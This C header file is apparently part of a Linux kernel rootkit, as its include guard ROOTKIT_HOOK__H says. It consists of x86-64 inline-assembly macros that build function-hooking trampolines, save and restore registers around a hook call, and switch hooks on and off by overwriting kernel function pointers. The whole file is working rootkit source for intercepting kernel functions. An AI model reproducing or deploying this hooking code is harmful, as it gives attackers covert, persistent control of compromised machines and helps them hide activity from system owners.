#ifndef ROOTKIT_HOOK__H
# define ROOTKIT_HOOK__H

# define SAVE_REGS                                   \
    "pushfq                \n"                       \
    "push      %%rsp       \n"                       \
    "push      %%rdi       \n"                       \
    "push      %%rsi       \n"                       \
    "push      %%rdx       \n"                       \
    "push      %%rcx       \n"                       \
    "push      %%rax       \n"                       \
    "push      %%r8        \n"                       \
    "push      %%r9        \n"                       \
    "push      %%r10       \n"                       \
    "push      %%r11       \n"                       \
    "push      %%rbx       \n"                       \
    "push      %%rbp       \n"                       \
    "push      %%r12       \n"                       \
    "push      %%r13       \n"                       \
    "push      %%r14       \n"                       \
    "push      %%r15       \n"

# define RESTORE_REGS                                \
    "pop       %%r15       \n"                       \
    "pop       %%r14       \n"                       \
    "pop       %%r13       \n"                       \
    "pop       %%r12       \n"                       \
    "pop       %%rbp       \n"                       \
    "pop       %%rbx       \n"                       \
    "pop       %%r11       \n"                       \
    "pop       %%r10       \n"                       \
    "pop       %%r9        \n"                       \
    "pop       %%r8        \n"                       \
    "pop       %%rax       \n"                       \
    "pop       %%rcx       \n"                       \
    "pop       %%rdx       \n"                       \
    "pop       %%rsi       \n"                       \
    "pop       %%rdi       \n"                       \
    "pop       %%rsp       \n"                       \
    "popfq                 \n"

# define create_hook_reg(Name)                       \
    static unsigned long orig_##Name;                \
    static unsigned long hook_##Name;                \
    extern asmlinkage void Name(void);               \
    void __unused_##Name(void)                       \
    {                                                \
        asm volatile (                               \
            ".globl "#Name"\n"                       \
            ".align 8, 0x90\n"                       \
            #Name":\n"                               \
            SAVE_REGS                                \
            "mov %%rsp, %%rdi\n"                     \
            "call *%1\n"                             \
            RESTORE_REGS                             \
            "jmp *%0\n"                              \
            :: "m"(orig_##Name), "m"(hook_##Name));  \
    }

//FIXME: no new stack frame
# define create_hook_rw(Name)                        \
    static unsigned long orig_##Name;                \
    static unsigned long hook_##Name;                \
    extern asmlinkage void Name(void);               \
    void __unused_##Name(void)                       \
    {                                                \
        asm volatile (                               \
            ".globl "#Name"\n"                       \
            ".align 8, 0x90\n"                       \
            #Name":\n"                               \
            "call *%1\n"                             \
            "jmp *%0\n"                              \
            :: "m"(orig_##Name), "m"(hook_##Name));  \
    }

# define create_hook_ro(Name)                        \
    static unsigned long orig_##Name;                \
    static unsigned long hook_##Name;                \
    extern asmlinkage void Name(void);               \
    void __unused_##Name(void)                       \
    {                                                \
        asm volatile (                               \
            ".globl "#Name"\n"                       \
            ".align 8, 0x90\n"                       \
            #Name":\n"                               \
            SAVE_REGS                                \
            "call *%1\n"                             \
            RESTORE_REGS                             \
            "jmp *%0\n"                              \
            :: "m"(orig_##Name), "m"(hook_##Name));  \
    }

# define hook_config(Name, Fct, Addr)                \
    do {                                             \
        hook_##Name = (unsigned long)Addr;           \
        orig_##Name = (unsigned long)Fct;            \
    } while (0)

struct my_hook {
    unsigned long addr;
    unsigned long orig;
    unsigned long hook;
};

# define HOOK_INIT(Name, Addr)                       \
    .addr = (unsigned long)Addr,                     \
    .orig = *((unsigned long *)Addr),                \
    .hook = (unsigned long)Name,

# define thook_enable(Hook)                                     \
    *((unsigned long *)Hook.addr) = (unsigned long)Hook.hook;

# define thook_disable(Hook)                                    \
    *((unsigned long *)Hook.addr) = (unsigned long)Hook.orig;

#endif /* !ROOTKIT_HOOK_H */
